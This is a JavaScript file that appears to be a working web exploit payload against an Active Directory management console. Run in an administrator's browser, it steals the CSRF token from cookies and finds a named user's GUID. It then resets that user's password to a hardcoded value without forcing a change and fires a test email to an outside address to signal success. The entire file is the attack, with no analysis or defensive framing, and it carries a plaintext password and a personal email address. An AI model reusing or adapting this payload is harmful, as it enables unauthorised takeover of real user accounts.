function searchUser() {
	var domainName = "wsm16.com";
	var userName = "ela_vul1";
	var pwd = "Test%401234";
	var mailId = "elangovant15@gmail.com";
	
	var getGUIDReq = new XMLHttpRequest();
	getGUIDReq.open('POST', '/ModifySingleUser.do?selectedTab=admin&methodToCall=showUserResultList', true);
	getGUIDReq.setRequestHeader('Content-type', 'application/x-www-form-urlencoded;charset=UTF-8');
	
	var params = "&domain=["+ domainName +"]&searchText="+ userName +"&action=modifyPassword&pageNavigation={startIndex:1,toIndex:1,range:100,isNavigate:false}&adscsrf=" + getCookie('adscsrf');
	getGUIDReq.onload = function () {
		var resp = (JSON.stringify(this.responseText));
		var userGUID = getGuid(resp);
		changePassword(userGUID,domainName,pwd,mailId);					
	};
	getGUIDReq.send(params);
}

function changePassword(userGUID, domainName, pwd, mailId) {	
	var changePassReq = new XMLHttpRequest();
	changePassReq.open('POST', '/ModifySingleUser.do?methodToCall=resetPassword', true);
	changePassReq.setRequestHeader('Content-type', 'application/x-www-form-urlencoded;charset=UTF-8');	
	var params = "&user={"+ userGUID +"}&domain="+ domainName +"&randomPwd=false&mustChangePassword=false&password="+ pwd +"&adscsrf=" + getCookie('adscsrf');
	changePassReq.onload = function () {
		var resp = (JSON.stringify(this.responseText));
		if(resp.indexOf("Successfully modified")!=-1){
			sendMaill(mailId);
		}else{
			//alert(this.responseText);
		}
	};
	changePassReq.send(params);
}

function sendMaill(mailId){
	var sendMailReq = new XMLHttpRequest();
	sendMailReq.open('POST', '/scheduler.do?methodToCall=sendTestMail', true);
	sendMailReq.setRequestHeader('Content-type', 'application/x-www-form-urlencoded;charset=UTF-8');
	
	var params = "&mailids="+ mailId +"&adscsrf=" + getCookie('adscsrf');
	sendMailReq.onload = function () {
		//alert(this.responseText);		
	};
	sendMailReq.send(params);
}

function getCookie(name) {
  var value = "; " + document.cookie;
  var parts = value.split("; " + name + "=");
  if (parts.length == 2) return parts.pop().split(";").shift();
}

function getGuid(respText){
	
	var parts = respText.split("illActionElements('");	
	if (parts.length == 2) return parts.pop().split("'").shift();
	
}

searchUser();
